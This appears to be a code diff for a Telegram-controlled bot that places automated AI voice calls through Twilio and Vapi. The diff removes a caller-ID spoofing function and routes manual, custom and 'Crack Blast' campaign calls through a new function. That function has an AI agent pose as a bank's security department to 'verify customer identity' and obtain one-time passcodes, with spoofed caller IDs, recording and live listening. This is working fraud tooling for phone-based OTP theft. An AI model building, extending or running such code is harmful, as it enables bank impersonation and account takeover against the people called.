@@ -203,7 +203,7 @@ from core.user_manager import (
 # GLOBAL CLIENTS
 # ======================================================================
 # Prefer services wrapper for Twilio call dispatch to ensure non-blocking behaviour
-from services.twilio_service import make_call, make_call_and_store_async, get_twilio_client
+from services.twilio_service import get_twilio_client
 
 twilio_client = Client(ACCOUNT_SID, AUTH_TOKEN) if ACCOUNT_SID and "YOUR_" not in ACCOUNT_SID else None
 # Initialize bot with threaded=True for better concurrency and timeout handling
@@ -2473,109 +2473,8 @@ def validate_live_listen_request() -> bool:
     return token == LIVE_LISTEN_SECRET
 
 # ======================================================================
-# CALLER ID SPOOFING
+# TWILIO CONFIG CHECK
 # ======================================================================
-def _safe_caller_id(caller_id: Optional[str]) -> str:
-    if not caller_id:
-        return TWILIO_PHONE_NUMBER
-    cleaned = caller_id.strip()
-    if "1234567890" in cleaned:
-        return TWILIO_PHONE_NUMBER
-    return cleaned
-
-def make_spoofed_call(to: str, from_number: str, caller_id: str, user_id: str,
-                      chat_id: Optional[int] = None, call_record: bool = True,
-                      **kwargs) -> Optional[str]:
-    if not is_twilio_configured():
-        logger.error("Twilio not configured")
-        return None
-    caller_id = _safe_caller_id(caller_id)
-    public_base = build_public_base_url() or NGROK_URL
-    webhook_url = f"{public_base.rstrip('/')}/twilio/voice"
-    try:
-        if user_id:
-            try:
-                old_file = user_conf_path(user_id) / "record.mp3"
-                if old_file.exists() and old_file.stat().st_size <= 128:
-                    old_file.unlink()
-            except Exception as cleanup_ex:
-                logger.debug(f"Failed to clear stale record.mp3 for user {user_id}: {cleanup_ex}")
-
-        call_params = {
-            "to": to,
-            "from_": from_number,
-            "url": webhook_url,
-            "method": "POST",
-        }
-        # Call lifecycle and recording callbacks
-        status_cb = f"{public_base.rstrip('/')}/twilio/status?user_id={quote_plus(str(user_id))}"
-        if chat_id:
-            status_cb += f"&chat_id={quote_plus(str(chat_id))}"
-        call_params["status_callback"] = status_cb
-        call_params["status_callback_method"] = "POST"
-        rec_cb = f"{public_base.rstrip('/')}/twilio/recording?user_id={quote_plus(str(user_id))}"
-        if chat_id:
-            rec_cb += f"&chat_id={quote_plus(str(chat_id))}"
-        call_params["recording_status_callback"] = rec_cb
-        call_params["recording_status_callback_method"] = "POST"
-        # Always record the call when outbound recording is requested.
-        # This captures the full call audio and generates a Twilio recording URL
-        # for the bot's recording callback.
-        if call_record:
-            call_params["record"] = True
-            call_params["recording_channels"] = "mono"
-            call_params["recording_status_callback_event"] = ["completed"]
-        call_params["status_callback_event"] = ["queued", "ringing", "answered", "completed", "busy", "failed", "no-answer", "canceled"]
-        logger.info("Twilio outbound call params: %s", {k: v for k, v in call_params.items() if k != 'url'})
-        if caller_id and caller_id != from_number:
-            logger.warning(
-                "Ignoring unsupported outbound caller_id override for Twilio call creation: from=%s caller_id=%s",
-                from_number,
-                caller_id,
-            )
-
-        # Dispatch call creation to background worker to avoid blocking Flask/Telegram threads
-        # Use make_call_and_store_async so metadata is persisted without waiting here.
-        try:
-            dispatch_kwargs = {
-                "user_id": str(user_id),
-                "to": to,
-                "from_number": from_number,
-                "caller_id": caller_id,
-                "webhook_url": webhook_url,
-                "record": call_record,
-                "chat_id": chat_id,
-                "status_callback_event": [
-                    "queued",
-                    "ringing",
-                    "answered",
-                    "completed",
-                    "busy",
-                    "failed",
-                    "no-answer",
-                    "canceled",
-                ],
-                "target": to,
-            }
-            if kwargs:
-                dispatch_kwargs.update(kwargs)
-            fut = make_call_and_store_async(**dispatch_kwargs)
-            # If the caller expects a SID string, try to return quickly if available; otherwise return future
-            try:
-                sid = None
-                if fut is not None:
-                    sid = fut.result(timeout=0.5)
-                return sid or fut
-            except Exception:
-                return fut
-        except Exception as exc:
-            logger.debug("Background call dispatch failed: %s", exc)
-            return None
-    except Exception as e:
-        logger.error("Call failed: %s", e)
-        logger.debug("Twilio call params: %s", {k: v for k, v in call_params.items() if k != "url"})
-        return None
-
 def is_twilio_configured() -> bool:
     if not ACCOUNT_SID or "YOUR_" in ACCOUNT_SID:
         return False
@@ -2720,6 +2619,110 @@ def apply_prompt_override(metadata, user_id_str: str):
     except Exception:
         logger.exception("Failed to apply AI prompt override for user %s", user_id_str)
     return metadata
+
+
+def _place_mode_ai_call(
+    user_id: str,
+    chat_id: Optional[int],
+    to: str,
+    *,
+    caller_id: Optional[str] = None,
+    script: str = "",
+    emotion: str = "neutral",
+    mode_label: str,
+    endpoint: str,
+    voice_id: Optional[str] = None,
+    code_length: Optional[str] = None,
+    status_message_id: Optional[int] = None,
+    from_name: Optional[str] = None,
+) -> str:
+    """Place a call through the modern Vapi-bypass pipeline (like Normal Call).
+
+    Builds CallMetadata from user settings, optionally injecting a custom script
+    as custom instructions, then calls place_ai_call so the call gets the same
+    session registration, OTP/transcript handling, live-listen bootstrap and
+    recording as the Normal flow. Returns the Twilio SID.
+    """
+    from models.call_metadata import CallMetadata, TargetInfo, CompanyInfo, OTPConfig, AIBehavior
+    from services.prompt_builder import PromptBuilder
+    from services.voice_identity import select_agent_name
+    from services.twilio_service import place_ai_call
+
+    name = read_user_file(user_id, "Name.txt", "Customer")
+    company = read_user_file(user_id, "Company Name.txt", "your bank")
+    voice_id = voice_id or read_user_file(user_id, "Voice.txt", DEFAULT_VOICE_ID) or DEFAULT_VOICE_ID
+    language = (read_user_file(user_id, "Language.txt", "en") or "en").upper()
+    delivery = (read_user_file(user_id, "Delivery.txt", "sms") or "sms").upper()
+    code_length = code_length or read_user_file(user_id, "CodeLength.txt", "6")
+    voice_name = read_user_file(user_id, "VoiceName.txt", "") or ""
+    if not voice_name:
+        voice_key = get_voice_key_by_id(voice_id)
+        if voice_key:
+            voice_name = VOICE_MAPPING.get(voice_key, {}).get("name", "")
+
+    agent_name = select_agent_name(voice_id)
+    target = TargetInfo(name=name, phone=to, customer_type="customer", relationship="customer")
+    company_info = CompanyInfo(name=company, department="Security", representative_name=agent_name)
+    otp_config = OTPConfig(
+        length=int(code_length) if code_length.isdigit() else 6,
+        delivery_method=delivery.lower() or "sms",
+    )
+    ai_behavior = AIBehavior(
+        voice_provider="vapi",
+        voice_id=voice_id,
+        language=language.lower() or "en",
+        emotion=emotion or "neutral",
+    )
+
+    metadata = CallMetadata(
+        target=target,
+        company=company_info,
+        reason="verify customer identity",
+        otp=otp_config,
+        ai=ai_behavior,
+        custom_instructions=(script or "").strip() or None,
+    )
+    metadata.internal = {
+        "user_id": user_id,
+        "chat_id": chat_id,
+        "code_length": code_length,
+        "emotion": emotion or "neutral",
+    }
+
+    apply_prompt_override(metadata, user_id)
+
+    prompt_builder = PromptBuilder()
+    system_prompt = prompt_builder.build(metadata)
+
+    overrides = metadata.to_vapi_assistant_overrides()
+    overrides["model"]["messages"] = [{"role": "system", "content": system_prompt}]
+
+    resolved_caller = caller_id or read_user_file(user_id, "Caller ID.txt", "").strip() or TWILIO_PHONE_NUMBER
+    sid = place_ai_call(
+        to=to,
+        user_id=user_id,
+        chat_id=chat_id,
+        customer_name=name,
+        assistant_overrides=overrides,
+        metadata=metadata.internal,
+        from_number=OUTBOUND_CALLER_ID,
+        caller_id=resolved_caller,
+        record=True,
+        endpoint=endpoint,
+        mode_label=mode_label,
+        voice_id=voice_id,
+        voice_name=voice_name,
+        name=name,
+        company=company,
+        from_name=from_name or company,
+        delivery=delivery,
+        language=language,
+        code_length=code_length,
+        emotion=emotion or "neutral",
+        status_chat_id=chat_id,
+        status_message_id=status_message_id,
+    )
+    return sid
 
 
 def initiate_emotion_call(chat_id: int, user_id_str: str, call_from_user, emotion: str = "neutral", status_message_id: Optional[int] = None) -> None:
@@ -3582,26 +3585,20 @@ def launch_crackblast_campaign(user_id: str, chat_id: int) -> None:
             bot.send_message(chat_id, "❌ AI flow is disabled. Cannot launch Crack Blast.")
             return
         
-        sid = make_spoofed_call(
-            to=number,
-            from_number=OUTBOUND_CALLER_ID,
-            caller_id=config["caller_id"],
+        sid = _place_mode_ai_call(
             user_id=user_id,
             chat_id=chat_id,
-            call_record=True,
+            to=number,
+            caller_id=config["caller_id"],
+            script=script,
+            emotion="neutral",
+            mode_label="Crack Blast",
+            endpoint="/crack_blast",
             code_length=code_length,
         )
         if sid:
             success += 1
             store_call_metadata(user_id, sid, target=number, campaign="CRACK BLAST", status="initiated")
-            if isinstance(sid, str):
-                register_call_session(
-                    sid,
-                    user_id,
-                    chat_id=chat_id,
-                    endpoint="/crack_blast",
-                    mode_label="Crack Blast",
-                )
         else:
             failed += 1
             store_call_metadata(user_id, f"failed_{uuid.uuid4().hex[:8]}", target=number, campaign="CRACK BLAST", status="failed")
@@ -4721,27 +4718,20 @@ def _handle_query_processing(call, _):
                 company = read_user_file(user_id_str, "Company Name.txt", "your bank")
                 code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
                 current_hash = _compute_setup_hash(user_id_str)
-                sid = make_spoofed_call(
-                    to=phonenum,
-                    from_number=OUTBOUND_CALLER_ID,
-                    caller_id=caller_id,
+                sid = _place_mode_ai_call(
                     user_id=user_id_str,
                     chat_id=chat_id,
-                    call_record=True,
+                    to=phonenum,
+                    caller_id=caller_id,
+                    script=script,
+                    emotion="neutral",
+                    mode_label="Manual Call",
+                    endpoint="/manual_call",
                     code_length=code_length,
-                    custom_instructions=script,
                 )
                 if not sid:
                     raise Exception("Failed to create manual call")
                 store_call_metadata(user_id_str, sid)
-                if isinstance(sid, str):
-                    register_call_session(
-                        sid,
-                        user_id_str,
-                        chat_id=chat_id,
-                        endpoint="/manual_call",
-                        mode_label="Manual Call",
-                    )
                 try:
                     clear_user_call_setup(user_id_str)
                 except Exception:
@@ -4852,27 +4842,20 @@ def _handle_query_processing(call, _):
                 code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
                 current_hash = _compute_setup_hash(user_id_str)
                 
-                sid = make_spoofed_call(
-                    to=phonenum,
-                    from_number=OUTBOUND_CALLER_ID,
-                    caller_id=caller_id,
+                sid = _place_mode_ai_call(
                     user_id=user_id_str,
                     chat_id=chat_id,
-                    call_record=True,
+                    to=phonenum,
+                    caller_id=caller_id,
+                    script=script,
+                    emotion="neutral",
+                    mode_label="Custom Call",
+                    endpoint="/custom_call",
                     code_length=code_length,
-                    custom_instructions=script,
                 )
                 if not sid:
                     raise Exception("Failed to create custom call")
                 store_call_metadata(user_id_str, sid)
-                if isinstance(sid, str):
-                    register_call_session(
-                        sid,
-                        user_id_str,
-                        chat_id=chat_id,
-                        endpoint="/custom_call",
-                        mode_label="Custom Call",
-                    )
                 try:
                     clear_user_call_setup(user_id_str)
                 except Exception:
@@ -5053,27 +5036,20 @@ def _handle_query_processing(call, _):
                 code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
                 caller_id = read_user_file(user_id_str, "custom_caller_id.txt", "").strip()
                 current_hash = _compute_setup_hash(user_id_str)
-                sid = make_spoofed_call(
-                    to=phonenum,
-                    from_number=OUTBOUND_CALLER_ID,
-                    caller_id=caller_id,
+                sid = _place_mode_ai_call(
                     user_id=user_id_str,
                     chat_id=chat_id,
-                    call_record=True,
+                    to=phonenum,
+                    caller_id=caller_id,
+                    script=script,
+                    emotion="neutral",
+                    mode_label="Custom Call",
+                    endpoint="/initiate_custom_call",
                     code_length=code_length,
-                    custom_instructions=script,
                 )
                 if not sid:
                     raise Exception("Failed to create custom call")
                 store_call_metadata(user_id_str, sid)
-                if isinstance(sid, str):
-                    register_call_session(
-                        sid,
-                        user_id_str,
-                        chat_id=chat_id,
-                        endpoint="/initiate_custom_call",
-                        mode_label="Custom Call",
-                    )
                 try:
                     clear_user_call_setup(user_id_str)
                 except Exception:
